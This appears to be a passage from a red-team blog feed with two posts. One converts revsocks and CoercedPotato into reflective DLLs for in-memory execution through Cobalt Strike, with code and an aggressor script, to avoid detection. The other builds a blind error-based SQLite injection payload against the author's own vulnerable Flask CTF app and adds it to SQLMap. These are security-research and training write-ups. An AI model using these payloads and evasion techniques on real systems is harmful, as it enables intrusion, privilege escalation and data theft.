<p>For credentials dumping, we can use nanodump of Fortra to dump LSASS process to avoid detection. If we want to avoid touching LSASS, we show how Kerberos tickets can be extracted or generated by stealing Windows tokens.</p>]]></content><author><name>soka</name></author><category term="redteam" /><summary type="html"><![CDATA[Note: This blog post is the second one of the series Increase your stealth capabilities, make sure to have read the first part.]]></summary></entry><entry><title type="html">Create Reflective DLL for Cobalt Strike</title><link href="https://sokarepo.github.io//redteam/2023/10/11/create-reflective-dll-for-cobaltstrike.html" rel="alternate" type="text/html" title="Create Reflective DLL for Cobalt Strike" /><published>2023-10-11T00:00:00+02:00</published><updated>2023-10-11T00:00:00+02:00</updated><id>https://sokarepo.github.io//redteam/2023/10/11/create-reflective-dll-for-cobaltstrike</id><content type="html" xml:base="https://sokarepo.github.io//redteam/2023/10/11/create-reflective-dll-for-cobaltstrike.html"><![CDATA[<h2 id="context">Context</h2>

<p>This blog post aims to solve a problem I faced when using open source tooling with Cobalt Strike.</p>

<p>During my security assessments I often rely on tooling developped in Python, C#, Go or C/C++.
Opensource tools are very often built to produce a PE file that doesn’t fit well on red team engagement as we prefer to avoid uploading and executing file on disk.
For Python tools, we need a SOCKS proxy but C2 SOCKS are quite slow as the SOCKS traffic is over the egress C2 traffic of the beacon.</p>

<p>In this blogpost I’m going to show how I ported 2 tools so that they produce a Reflective DLL (RDLL) which could be used in CobaltStrike and executing everything from memory.</p>

<h2 id="golang---revsocks">Golang - revsocks</h2>

<p>To overcome the SOCKS latency issue, I’m using a modified version of <a href="https://github.com/kost/revsocks">revsocks</a>.
Revsocks is splited in 2 parts: the server and the client. The server listens for incoming connections and starts a SOCKS server when a valid connection is
established.</p>

<p>Back to 2019, <a href="https://twitter.com/_EthicalChaos_">@<em>EthicalChaos</em></a> made a blogpost about how we can used Golang tooling with Cobalt Strike (<a href="https://ethicalchaos.dev/2020/01/26/weaponizing-your-favorite-go-program-for-cobalt-strike/">Weaponizing your favorite Go program for Cobalt Strike</a>) and released <a href="https://github.com/CCob/goreflect">goreflect</a>, a template to generate a RDLL from a Go project.</p>

<p>I had some issue using this template from a Linux machine so I will explain what I did to make it work.</p>

<p><br />
Before anything, we will compile a Golang program so the PE will be quite large. So we need to increase the task size limit in the malleable profile in order to transfer the RDLL to the beacon</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>tasks_max_size <span class="s2">"5048576"</span><span class="p">;</span>
</code></pre></div></div>
<p><br /></p>

<p>Now clone the template Github repository</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/CCob/goreflect
</code></pre></div></div>

<p>Then modify <code class="language-plaintext highlighter-rouge">CMakeLists.txt</code> to add the following flags</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>project <span class="o">(</span>goreflect<span class="o">)</span>

<span class="c">#Dependency to add simple Go support to CMake</span>
include<span class="o">(</span><span class="k">${</span><span class="nv">CMAKE_SOURCE_DIR</span><span class="k">}</span>/cmake/GolangSimple.cmake<span class="o">)</span>

<span class="c"># flags for cross compilation</span>
<span class="nb">set</span><span class="o">(</span>CMAKE_C_COMPILER x86_64-w64-mingw32-gcc<span class="o">)</span>
<span class="nb">set</span><span class="o">(</span>GOOS windows<span class="o">)</span>
<span class="nb">set</span><span class="o">(</span>GARCH amd64<span class="o">)</span>
<span class="nb">set</span> <span class="o">(</span>DIST_DIR <span class="k">${</span><span class="nv">CMAKE_SOURCE_DIR</span><span class="k">}</span>/dist<span class="o">)</span>
</code></pre></div></div>

<p>I removed the following lines</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Your favorite go tool definition</span>
GO_GET<span class="o">(</span>gobuster github.com/OJ/gobuster<span class="o">)</span>
</code></pre></div></div>

<p>I added this at the end of the file to create the final RDLL file</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>add_custom_command<span class="o">(</span>
        TARGET goreflect POST_BUILD
        COMMAND <span class="k">${</span><span class="nv">CMAKE_COMMAND</span><span class="k">}</span> <span class="nt">-E</span> copy
                <span class="k">${</span><span class="nv">CMAKE_BINARY_DIR</span><span class="k">}</span>/libgoreflect.so
                <span class="k">${</span><span class="nv">DIST_DIR</span><span class="k">}</span>/revsocks.dll<span class="o">)</span>
</code></pre></div></div>

<p>And I renamed the references of <code class="language-plaintext highlighter-rouge">gobuster</code> to match <code class="language-plaintext highlighter-rouge">revsocks</code>.</p>

<p><br /></p>

<p>As revsocks is not developped as a library, we cannot just parse the arguments of the RDLL and pass them to a revsocks API.</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">//export start</span>
<span class="k">func</span> <span class="n">start</span><span class="p">(</span><span class="n">arg</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">args</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">gsq</span><span class="o">.</span><span class="n">Split</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="nb">append</span><span class="p">([]</span><span class="kt">string</span><span class="p">{</span><span class="s">"goreflect"</span><span class="p">},</span> <span class="n">args</span><span class="o">...</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">Args</span> <span class="o">=</span> <span class="n">args</span>
    
    <span class="c">// parse arg</span>
    <span class="c">// ...</span>

    <span class="c">// doesn't exist</span>
    <span class="n">revsocks</span><span class="o">.</span><span class="n">startclient</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">,</span> <span class="o">....</span><span class="p">)</span>

</code></pre></div></div>

<p>we need to copy the functions defined in <code class="language-plaintext highlighter-rouge">rclient.go</code> (from revsocks) to <code class="language-plaintext highlighter-rouge">goreflect.go</code> and call them in the main of the program</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">func</span> <span class="n">connectviaproxy</span><span class="p">(</span><span class="n">proxyaddr</span> <span class="kt">string</span><span class="p">,</span> <span class="n">connectaddr</span> <span class="kt">string</span><span class="p">)</span> <span class="n">net</span><span class="o">.</span><span class="n">Conn</span> <span class="p">{</span>
    <span class="c">// ...</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">connectForSocks</span><span class="p">(</span><span class="n">tlsenable</span> <span class="kt">bool</span><span class="p">,</span> <span class="n">verify</span> <span class="kt">bool</span><span class="p">,</span> <span class="n">address</span> <span class="kt">string</span><span class="p">,</span> <span class="n">proxy</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="c">// ....</span>
<span class="p">}</span>


<span class="c">//export start</span>
<span class="k">func</span> <span class="n">start</span><span class="p">(</span><span class="n">arg</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>

	<span class="c">//parse our monolithinc argument string into individual args</span>
	<span class="n">args</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">gsq</span><span class="o">.</span><span class="n">Split</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span>

	<span class="c">//our first argument is usally the program name, to just fake it</span>
	<span class="n">args</span> <span class="o">=</span> <span class="nb">append</span><span class="p">([]</span><span class="kt">string</span><span class="p">{</span><span class="s">"goreflect"</span><span class="p">},</span> <span class="n">args</span><span class="o">...</span><span class="p">)</span>

	<span class="k">if</span> <span class="n">err</span> <span class="o">==</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="c">//replace os.Args ready for calling our go program</span>
		<span class="n">os</span><span class="o">.</span><span class="n">Args</span> <span class="o">=</span> <span class="n">args</span>

		<span class="n">connect</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"connect"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"connect address:port"</span><span class="p">)</span>
		<span class="n">proxy</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"proxy"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"proxy address:port"</span><span class="p">)</span>
		<span class="n">optproxytimeout</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"proxytimeout"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"proxy response timeout (ms)"</span><span class="p">)</span>
		<span class="n">proxyauthstring</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"proxyauth"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"proxy auth Domain/user:Password "</span><span class="p">)</span>
		<span class="n">optuseragent</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"useragent"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"User-Agent"</span><span class="p">)</span>
		<span class="n">optpassword</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"pass"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"Connect password"</span><span class="p">)</span>
		<span class="n">recn</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">Int</span><span class="p">(</span><span class="s">"recn"</span><span class="p">,</span> <span class="m">3</span><span class="p">,</span> <span class="s">"reconnection limit"</span><span class="p">)</span>
		<span class="n">rect</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">Int</span><span class="p">(</span><span class="s">"rect"</span><span class="p">,</span> <span class="m">30</span><span class="p">,</span> <span class="s">"reconnection delay"</span><span class="p">)</span>

		<span class="n">flag</span><span class="o">.</span><span class="n">Usage</span> <span class="o">=</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>

			<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"revsocks - reverse socks5 server/client"</span><span class="p">)</span>
			<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
			<span class="n">flag</span><span class="o">.</span><span class="n">PrintDefaults</span><span class="p">()</span>
			<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
			<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Usage:"</span><span class="p">)</span>
			<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"1) Start on the client: revsocks -listen :8080 -socks 127.0.0.1:1080 -pass test"</span><span class="p">)</span>
			<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"3) Connect to 127.0.0.1:1080 on the client with any socks5 client."</span><span class="p">)</span>
		<span class="p">}</span>

        <span class="c">// parse os.Args</span>
		<span class="n">flag</span><span class="o">.</span><span class="n">Parse</span><span class="p">()</span>

		<span class="c">//run our go program</span>

		<span class="k">if</span> <span class="o">*</span><span class="n">connect</span> <span class="o">==</span> <span class="s">""</span> <span class="p">{</span>
			<span class="n">flag</span><span class="o">.</span><span class="n">Usage</span><span class="p">()</span>
			<span class="n">os</span><span class="o">.</span><span class="n">Exit</span><span class="p">(</span><span class="m">0</span><span class="p">)</span>
		<span class="p">}</span>

        <span class="c">// call to connectForSocks or something else...</span>
</code></pre></div></div>

<p>When <code class="language-plaintext highlighter-rouge">goreflect.go</code> is ready, you can build the project and it should produce <code class="language-plaintext highlighter-rouge">dist/revsocks.dll</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>cmake
cmake ..
make
</code></pre></div></div>

<p>Now we can create a Cobalt Strike agressor script to execute our RDLL:</p>
<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">beacon_command_register</span><span class="p">("</span><span class="s2">Revsocks</span><span class="p">",</span> <span class="p">"</span><span class="s2">Socks5 with NTLM proxy support</span><span class="p">",</span>
   <span class="p">"</span><span class="s2">Connect Usage: Revsocks -connect 20.20.20.20:443 -pass Password1</span><span class="se">\n</span><span class="p">");</span>


<span class="nv">alias</span> <span class="nv">Revsocks</span> <span class="p">{</span>
   <span class="nb">local</span><span class="p">('</span><span class="s1">$bid</span><span class="p">',</span> <span class="p">'</span><span class="s1">$args</span><span class="p">');</span>
   <span class="nv">$bid</span> <span class="o">=</span> <span class="err">$</span><span class="mi">1</span><span class="p">;</span>
   <span class="nv">$args</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="err">$</span><span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="nv">$args</span> <span class="ow">eq</span> <span class="p">"")</span> <span class="p">{</span>
      <span class="nv">berror</span><span class="p">(</span><span class="nv">$bid</span><span class="p">,</span> <span class="p">"</span><span class="s2">Please specify an argument string</span><span class="p">");</span>
		<span class="k">return</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="nv">blog</span><span class="p">(</span><span class="nv">$bid</span><span class="p">,</span> <span class="p">"</span><span class="s2">Spawn Revsocks as a Reflective DLL with args</span><span class="se">\n</span><span class="si">$args</span><span class="se">\n</span><span class="p">");</span>
   <span class="nv">bdllspawn</span><span class="p">(</span><span class="nv">$bid</span><span class="p">,</span> <span class="nv">script_resource</span><span class="p">("</span><span class="s2">dist/revsocks.dll</span><span class="p">"),</span> <span class="nv">$args</span><span class="p">,</span> <span class="p">"</span><span class="s2">Revsocks</span><span class="p">",</span> <span class="mi">5000</span><span class="p">,</span> <span class="nv">false</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Once the CNA is ready, load it in Cobalt Strike and call the Revsocks function in your beacon</p>

<p><img src="/assets/images/redteam/2023-10-11-create-reflective-dll-cobaltstrike/rdll-revsocks2.png" alt="Revsocks RDLL" /></p>

<p>And you should get a callback on your revsocks server</p>

<p><img src="/assets/images/redteam/2023-10-11-create-reflective-dll-cobaltstrike/revsocks-server.png" alt="Revsocks server" /></p>

<p><br /></p>

<h2 id="coercedpotato-for-privilege-escalation">CoercedPotato for privilege escalation</h2>

<p>During a recent engagement my teammates and I gained RCE on a Windows IIS server (I will make dedicated blogposts on this) and we ended up to get a beacon on the server as a NT Local Service account.</p>

<p>We sucessfuly used <a href="https://github.com/BeichenDream/GodPotato">GodPotato</a> through <code class="language-plaintext highlighter-rouge">execute-assembly</code> to get a SYSTEM beacon. However, <code class="language-plaintext highlighter-rouge">execute-assembly</code> can be easily spotted as it loads <code class="language-plaintext highlighter-rouge">CLR.dll</code> in the sacrificial process spawned by Cobalt Strike.</p>

<p>I wanted to have another solution without using <code class="language-plaintext highlighter-rouge">execute-assembly</code> and so I came up to using Reflective DLL loading.</p>

<p><br />
Two months ago, <a href="https://github.com/Prepouce/CoercedPotato">CoercedPotato</a> was released with the benefit to be a C++ tool so it can easily be ported to a RDLL.</p>

<p>I cloned the repo and integrate <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">Stephen Fewer RDLL library</a> to it.</p>

<p>There is not so much to talk about except I had to split the project in 2 parts</p>
<ul>
  <li>the RPC server / named pipe</li>
  <li>the coercer client</li>
</ul>

<p>I did not succeed to spawn the RPC server with <code class="language-plaintext highlighter-rouge">CreateThread</code> via a RDLL so I decided to first load the RDLL to spawn it, then to load it another time to coerce the SYSTEM authentication.</p>

<p>I removed some parts of the code to only keep the MS-RPRN coerce.</p>

<p>You can find the code on my Github <a href="https://github.com/sokaRepo/CoercedPotatoRDLL">CoercedPotatoRDLL</a>.</p>

<p><img src="/assets/images/redteam/2023-10-11-create-reflective-dll-cobaltstrike/coercedpotato.png" alt="CoercedPotato" /></p>]]></content><author><name>soka</name></author><category term="redteam" /><summary type="html"><![CDATA[Context]]></summary></entry><entry><title type="html">Implement a Blind Error-Based SQLMap payload for SQLite</title><link href="https://sokarepo.github.io//web/2023/08/24/implement-blind-sqlite-sqlmap.html" rel="alternate" type="text/html" title="Implement a Blind Error-Based SQLMap payload for SQLite" /><published>2023-08-24T00:00:00+02:00</published><updated>2023-08-24T00:00:00+02:00</updated><id>https://sokarepo.github.io//web/2023/08/24/implement-blind-sqlite-sqlmap</id><content type="html" xml:base="https://sokarepo.github.io//web/2023/08/24/implement-blind-sqlite-sqlmap.html"><![CDATA[<h2 id="context">Context</h2>

<p>Back to 2019, my first HackTheBox box <code class="language-plaintext highlighter-rouge">Intense</code> was released with several steps involved:</p>
<ul>
  <li>exploit a SQL injection for SQLite DMBS on the web application</li>
  <li>use a hash length extension attack to login as admin on the web application</li>
  <li>leak the SNMP config through a file disclure to get a shell on the underlying server</li>
  <li>exploit an ELF binary to gain root access to the box</li>
</ul>

<p><br />
The goal of this post is not to make a write-up of the box but to focus on the SQL injection part and how we can easily create
new SQLMap payloads.</p>

<p><br /></p>

<h2 id="the-sql-injection">The SQL injection</h2>

<p>When I created this challenge, I had in mind that the SQL injection should not be trivial and gets
people to think about a new payload. So of course, SQLMap doesn’t work as its payloads are quite long.</p>

<p><br /></p>

<p>Here is the vulnerability in the Flask application:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/submitmessage"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">submitmessage</span><span class="p">():</span>
    <span class="n">message</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"message"</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">140</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"message too long"</span>
    <span class="k">if</span> <span class="n">badword_in_str</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
        <span class="k">return</span> <span class="s">"forbidden word in message"</span>
    <span class="c1"># insert new message in DB
</span>    <span class="k">try</span><span class="p">:</span>
        <span class="n">query_db</span><span class="p">(</span><span class="s">"insert into messages values ('%s')"</span> <span class="o">%</span> <span class="n">message</span><span class="p">)</span>
    <span class="k">except</span> <span class="n">sqlite3</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"OK"</span>
</code></pre></div></div>

<p><br /></p>

<p>The check on the message length was to limit users to use time-based SQL injection (spoiler alert: it didn’t work).</p>

<p><br /></p>

<p>As the goal of the blog post is to find a new payload which is more efficient than payload based on time, I removed the length check for the coming tests to help SQLMap.</p>

<p><br /></p>

<p>Now if we run SQLMap, it should identify a time-based blind payload:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> python sqlmap.py <span class="nt">-u</span> http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s1">'message=a'</span> <span class="nt">-p</span> <span class="s1">'message'</span> <span class="nt">--dbms</span><span class="o">=</span>sqlite <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3
        ___
       __H__
 ___ ___[<span class="s2">"]_____ ___ ___  {1.7.8.8#dev}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:10:17 /2023-08-24/

[13:10:17] [INFO] testing connection to the target URL
[13:10:17] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:10:17] [INFO] testing if the target URL content is stable
[13:10:18] [INFO] target URL content is stable
[13:10:18] [WARNING] heuristic (basic) test shows that POST parameter 'message' might not be injectable
[13:10:18] [INFO] testing for SQL injection on POST parameter 'message'
[13:10:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:10:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[13:10:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[...]
[13:10:31] [INFO] POST parameter 'message' appears to be 'SQLite &gt; 2.0 AND time-based blind (heavy query)' injectable
[...]
</span></code></pre></div></div>

<p><br /></p>

<h2 id="exploitation-strategy">Exploitation strategy</h2>
<p>SQL injections in INSERT clause are often error-based but to my knowledge, there is no SQLite function, by default, that allows us to leak raw information through an exception/error.</p>

<p><br /></p>

<p>When we submit a message on the web application, the string “OK” is returned when the message has been successfuly inserted or an exception is raised if an error occured:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> curl http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s2">"message="</span>
OK%

<span class="o">&gt;</span> curl http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s2">"message='"</span>
unrecognized token: <span class="s2">"''')"</span>%
</code></pre></div></div>

<p><br /></p>

<p>Basic blind SQL payloads don’t work here:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; curl http://127.0.0.1:5000/submitmessage --data "message=aaaa' and 1=1 and 'a'='a"
OK%

&gt; curl http://127.0.0.1:5000/submitmessage --data "message=aaaa' and 1=2 and 'a'='a"
OK%
</code></pre></div></div>

<p><br /></p>

<p>Our approach is to find a SQLite function that triggers one of the following behaviour:</p>
<ul>
  <li>servers returns the error in the header/body page</li>
  <li>HTTP 500 status code</li>
</ul>

<p><br /></p>

<p>The core of the injection will look like:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' and case when 1=2 then 1 else function_to_find(xxx) end and 'a'='a -&gt; ERROR
</code></pre></div></div>

<p><br /></p>

<h2 id="find-the-right-function">Find the right function</h2>

<p>We will use two things:</p>
<ul>
  <li><a href="https://www.sqlite.org/lang_corefunc.html">SQLite documentation</a></li>
  <li>SQLite interpreter, <code class="language-plaintext highlighter-rouge">sqlite3</code> in my Linux system</li>
</ul>

<p><br /></p>

<p>SQLite has several core functions that you can find in the documentation.
We may want to look for “logic vulnerable” functions/clause that compute integer:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">pow</code>, <code class="language-plaintext highlighter-rouge">exp</code> may create an integer overflow</li>
  <li>division by 0 may create an error</li>
</ul>

<p><br />
However, if we try them in the SQLite interpreter none of them raise an error:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlite&gt; select pow(999999,999999999999);
Inf
sqlite&gt; select exp(99999999);
Inf
sqlite&gt; select 1/0;

sqlite&gt;
</code></pre></div></div>

<p><br /></p>

<p>A solution is to look at every function and check what the doc says or by CTRL+F keywords such as <code class="language-plaintext highlighter-rouge">error</code>, <code class="language-plaintext highlighter-rouge">exception</code>, <code class="language-plaintext highlighter-rouge">raise</code>.</p>

<p><br /></p>

<p>Four years ago, I came up using the function <code class="language-plaintext highlighter-rouge">load_extension()</code> that loads a library (.so, .dll) on the disk. By default, loading extension is disabled and the function throws an error.</p>

<p><br /></p>

<p>On the interpreter</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlite&gt; select load_extension(0);
Runtime error: 0.so: cannot open shared object file: No such file or directory
</code></pre></div></div>

<p><br /></p>

<p>On the application</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; curl http://127.0.0.1:5000/submitmessage --data "message=aaaa' and load_extension(0) and 'a'='a"
not authorized%
</code></pre></div></div>

<p><br /></p>

<p>And today, I looked back at the documentation if I could find other functions and decrease my SQLi payload length.</p>

<p><br /></p>

<p>In the math functions section, I noticed the <code class="language-plaintext highlighter-rouge">abs</code> function and the documentation says the function raises an integer overflow error if the integer argument is equal to <code class="language-plaintext highlighter-rouge">-9223372036854775808</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlite&gt; select abs(-9223372036854775808);
Runtime error: integer overflow
</code></pre></div></div>

<p><br /></p>

<p>In the json section, the documentation says that every json functions raise an error if the text value is not a well-formed JSON object. Quite similar to the <code class="language-plaintext highlighter-rouge">UPDATEXML</code> or <code class="language-plaintext highlighter-rouge">EXTRACTVALUE</code> MySQL functions.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlite&gt; select json('');
Runtime error: malformed JSON
</code></pre></div></div>

<p><br /></p>

<h2 id="exploitation">Exploitation</h2>

<p>Using <code class="language-plaintext highlighter-rouge">load_extension</code> or <code class="language-plaintext highlighter-rouge">abs</code> is possible but <code class="language-plaintext highlighter-rouge">json</code> function is the shortest.</p>

<table>
  <thead>
    <tr>
      <th>Function</th>
      <th>   Length</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>load_extension(0)</td>
      <td>   17</td>
    </tr>
    <tr>
      <td>abs(-9223372036854775808)</td>
      <td>   25</td>
    </tr>
    <tr>
      <td>json(‘’)</td>
      <td>   8</td>
    </tr>
  </tbody>
</table>

<p><br /></p>

<p>Our payload is the following:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' and case when 1=2 then 1 else json('') end and 'a'='a
</code></pre></div></div>

<p><br /></p>

<p>And the result:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> curl http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s2">"message=' and case when 1=1 then 1 else json('') end and 'a'='a"</span>         
OK%

<span class="o">&gt;</span> curl http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s2">"message=' and case when 1=2 then 1 else json('') end and 'a'='a"</span>
malformed JSON%
</code></pre></div></div>

<p><br /></p>

<h2 id="implement-our-new-payload-in-sqlmap">Implement our new payload in SQLMap</h2>

<p>Now we have a working and efficient payload, we can implement it in SQLMap:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> git clone https://github.com/sqlmapproject/sqlmap
<span class="o">&gt;</span> <span class="nb">cd </span>sqlmap
</code></pre></div></div>

<p><br /></p>

<p>Add the following at the end of the file <code class="language-plaintext highlighter-rouge">data/xml/payloads/boolean_blind.xml</code>:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;test&gt;</span>
    <span class="nt">&lt;title&gt;</span>SQLite boolean-based blind<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;stype&gt;</span>1<span class="nt">&lt;/stype&gt;</span> <span class="c">&lt;!-- Injection type (Boolean, Error-based, ...) --&gt;</span>
    <span class="nt">&lt;level&gt;</span>1<span class="nt">&lt;/level&gt;</span> <span class="c">&lt;!-- When the test should be performed (1=Always) --&gt;</span>
    <span class="nt">&lt;risk&gt;</span>1<span class="nt">&lt;/risk&gt;</span> <span class="c">&lt;!-- Damage risk of the payload --&gt;</span>
    <span class="nt">&lt;clause&gt;</span>1<span class="nt">&lt;/clause&gt;</span> <span class="c">&lt;!-- Clause to inject (WHERE, GROUP BY, ...) --&gt;</span>
    <span class="nt">&lt;where&gt;</span>1<span class="nt">&lt;/where&gt;</span> <span class="c">&lt;!-- Where the payload should be inserted --&gt;</span>
    <span class="c">&lt;!-- [INFERENCE] SQLMap will insert the payload to extract data --&gt;</span>
    <span class="nt">&lt;vector&gt;</span>AND CASE WHEN [INFERENCE] THEN 1 ELSE json('') END <span class="nt">&lt;/vector&gt;</span> 
    <span class="nt">&lt;request&gt;</span>
    <span class="c">&lt;!-- Check for the vuln, should return 1 --&gt;</span>
        <span class="nt">&lt;payload&gt;</span>AND CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE json('') END<span class="nt">&lt;/payload&gt;</span> 
    <span class="nt">&lt;/request&gt;</span>
    <span class="nt">&lt;response&gt;</span>
        <span class="c">&lt;!-- 2nd check for the vuln, should raise the error --&gt;</span>
        <span class="nt">&lt;comparison&gt;</span>AND CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE json('') END<span class="nt">&lt;/comparison&gt;</span>
    <span class="nt">&lt;/response&gt;</span>
    <span class="nt">&lt;details&gt;</span>
        <span class="nt">&lt;dbms&gt;</span>SQLite<span class="nt">&lt;/dbms&gt;</span>
    <span class="nt">&lt;/details&gt;</span>
<span class="nt">&lt;/test&gt;</span>
</code></pre></div></div>

<p><br /></p>

<p>If we run SQLMap it should find the injection:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> python sqlmap.py <span class="nt">-u</span> http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s1">'message=a'</span> <span class="nt">-p</span> <span class="s1">'message'</span> <span class="nt">--dbms</span><span class="o">=</span>sqlite

<span class="o">[</span>...]

<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing connection to the target URL
<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing <span class="k">if </span>the target URL content is stable
<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] target URL content is stable
<span class="o">[</span>13:18:56] <span class="o">[</span>WARNING] heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test </span>shows that POST parameter <span class="s1">'message'</span> might not be injectable
